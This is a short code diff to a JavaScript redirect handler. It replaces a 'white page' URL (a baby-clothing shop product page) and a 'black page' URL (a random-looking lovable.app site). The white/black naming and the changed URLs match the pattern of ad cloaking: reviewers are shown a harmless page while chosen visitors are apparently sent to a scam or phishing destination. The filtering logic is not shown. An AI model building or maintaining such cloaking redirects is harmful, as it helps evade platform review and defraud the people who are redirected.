@@ -1,7 +1,7 @@
 export default function handler(req, res) {
     // URLs to redirect
-    const whitePageURL = "https://www.shopizz.pk/collections/pregnancy-pillow/products/pregnancy-support-pillow-u-shape-maternity-pillow-sleeping-support-pillow-in-grey-color";
-    const blackPageURL = "https://claimmsnwoowe.lovable.app";
+    const whitePageURL = "https://bellabambini.net/collections/baby-girls/products/mabini-girls-beige-teddy-smock-dress?variant=56202762551676";
+    const blackPageURL = "https://csshhhggot.lovable.app";
 
     //testing
   
@@ -27,6 +27,7 @@ export default function handler(req, res) {
   
     res.end();
   }
+
 
 
 
